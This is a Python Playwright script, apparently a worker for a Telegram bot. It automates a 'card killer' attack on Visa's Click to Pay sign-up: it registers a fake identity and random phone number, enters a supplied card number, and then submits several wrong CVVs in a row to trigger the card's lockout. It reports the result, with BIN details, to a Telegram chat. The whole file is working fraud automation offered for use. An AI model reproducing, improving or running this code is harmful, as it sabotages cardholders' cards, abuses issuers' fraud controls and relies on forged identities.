import asyncio
import random
import time
import traceback

from playwright.async_api import BrowserContext
from worker.utils import get_fake_identity, get_wrong_cvv, split_card, get_bin_info, tg_edit, tg_admin_screenshot

TIMEOUT = 4000


async def run(ctx: BrowserContext, card_input: str, chat_id: int, message_id: int) -> bool:
    page = await ctx.new_page()
    start = time.time()
    try:
        cc, mm, yy, real_cvv = split_card(card_input)
        identity = get_fake_identity()
        wrong_cvv = get_wrong_cvv(real_cvv)
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"

        bin_task = asyncio.create_task(get_bin_info(cc[:6]))

        await tg_edit(chat_id, message_id, "⚡ Processing (ultra-fast)...")
        await page.goto("https://src.visa.com/login", wait_until="commit", timeout=15000)

        try:
            await page.wait_for_selector("a.wscrOk", timeout=2000)
            await page.click("a.wscrOk")
        except Exception:
            pass

        # Step 1 — Login
        await page.wait_for_selector("#email-input", state="visible", timeout=TIMEOUT)
        await page.fill("#email-input", identity["email"])
        await page.click("xpath=//button[.//div[normalize-space()='Continue']]")

        await page.wait_for_selector("#login-phone-input-number", timeout=TIMEOUT)
        phone = (
            random.choice(["201", "202", "203", "205", "206", "207"])
            + random.choice(["201", "202", "303", "404"])
            + "".join(random.choices("0123456789", k=4))
        )
        await page.evaluate("id => { const el = document.getElementById(id); if(el) el.value=''; }", "login-phone-input-number")
        await page.fill("#login-phone-input-number", phone)
        await page.click("xpath=//input[@type='checkbox']")
        await page.click("xpath=//button[.//div[normalize-space()='Next']]")

        # Step 2 — Card
        await page.wait_for_selector("#first-name-input", state="visible", timeout=TIMEOUT)
        await asyncio.gather(
            page.fill("#first-name-input", identity["first_name"]),
            page.fill("#last-name-input", identity["last_name"]),
        )
        await page.evaluate("id => { const el = document.getElementById(id); if(el) el.value=''; }", "card-input")
        await page.fill("#card-input", cc)
        await page.fill("#expiration-input", mm + yy)
        await page.fill("#cvv-input", wrong_cvv)

        # Step 3 — Address
        try:
            await page.wait_for_selector('[data-testid="region-select"]', timeout=TIMEOUT)
            country_val = await page.input_value('[data-testid="region-select"]')
            if "United States" not in country_val:
                await page.fill('[data-testid="region-select"]', "United States")
                await page.keyboard.press("Enter")
        except Exception:
            pass

        await asyncio.gather(
            page.fill("#line1-input", identity["address"]),
            page.fill("#city-input", identity["city"]),
            page.fill("#stateProvinceCode-input", identity["state"]),
            page.fill("#zip-input", identity["zip"]),
        )

        add_btn_sel = "xpath=//div[normalize-space()='Add card']"
        await page.wait_for_selector(add_btn_sel, timeout=TIMEOUT)
        await page.click(add_btn_sel)
        await tg_edit(chat_id, message_id, "⚡ Updating (ultra-fast)...")

        # Step 4 — CVV loop (dd style: 5 attempts)
        used = {wrong_cvv}
        for _ in range(5):
            fake = get_wrong_cvv(real_cvv)
            while fake in used:
                fake = get_wrong_cvv(real_cvv)
            used.add(fake)
            try:
                await page.fill("#cvv-input", fake)
                await page.click(add_btn_sel)
                await page.wait_for_timeout(150)
            except Exception:
                pass

        bin_info, bin_flag = await bin_task
        await tg_edit(
            chat_id, message_id,
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"1 Procceed\n2 Processed\n\n"
            f"⚡ **Status:** Killed v6 Ultra-Fast\n"
            f"⏱ **Time:** {round(time.time() - start, 2)}s"
        )
        return True

    except Exception:
        trace = traceback.format_exc()
        await tg_edit(chat_id, message_id, "❌ Request timeout, try again.")
        try:
            screenshot = await page.screenshot()
            await tg_admin_screenshot("dd", trace, screenshot)
        except Exception:
            await tg_admin_screenshot("dd", trace, None)
        return False
    finally:
        await page.close()
